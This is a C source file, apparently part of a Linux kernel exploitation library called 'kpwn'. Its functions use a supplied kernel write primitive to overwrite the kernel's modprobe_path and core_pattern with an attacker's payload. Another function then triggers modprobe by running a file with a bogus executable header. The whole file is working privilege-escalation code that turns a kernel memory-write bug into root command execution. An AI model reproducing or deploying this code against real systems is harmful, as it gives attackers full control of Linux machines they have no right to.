#define _GNU_SOURCE

#include <kpwn/logger.h>
#include <kpwn/overwrite.h>
#include <kpwn/utils.h>

#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int kpwn_overwrite_modprobe(void *kbase, size_t modprobe_path_off,
                            const char *payload_path, kpwn_kwrite_fn write_fn,
                            void *ctx) {
  ASSERT_MSG(payload_path != NULL, "payload_path is NULL");
  size_t len = strlen(payload_path) + 1;
  ASSERT_MSG(len <= 256, "payload_path too long (max 256)");

  void *target = (char *)kbase + modprobe_path_off;
  int ret = write_fn(target, payload_path, len, ctx);

  if (ret == 0)
    log_success("[kpwn:overwrite] modprobe_path=%s target=%p", payload_path,
                target);
  else
    log_error("[kpwn:overwrite] modprobe_path write failed");

  return ret;
}

int kpwn_trigger_modprobe(const char *dummy_path) {
  ASSERT_MSG(dummy_path != NULL, "dummy_path is NULL");

  int fd = SYSCHK(open(dummy_path, O_WRONLY | O_CREAT | O_TRUNC, 0777));
  char header[] = "\xff\xff\xff\xff";
  SYSCHK(write(fd, header, sizeof(header)));
  close(fd);

  char cmd[512];
  snprintf(cmd, sizeof(cmd), "%s 2>/dev/null", dummy_path);

  log_info("[kpwn:overwrite] triggering modprobe via %s", dummy_path);
  system(cmd);
  return 0;
}

int kpwn_overwrite_core_pattern(void *kbase, size_t core_pattern_off,
                                const char *payload_cmd,
                                kpwn_kwrite_fn write_fn, void *ctx) {
  ASSERT_MSG(payload_cmd != NULL, "payload_cmd is NULL");
  size_t len = strlen(payload_cmd) + 1;
  ASSERT_MSG(len <= 128, "core_pattern payload too long (max 128)");

  void *target = (char *)kbase + core_pattern_off;
  int ret = write_fn(target, payload_cmd, len, ctx);

  if (ret == 0)
    log_success("[kpwn:overwrite] core_pattern=%s target=%p", payload_cmd,
                target);
  else
    log_error("[kpwn:overwrite] core_pattern write failed");

  return ret;
}
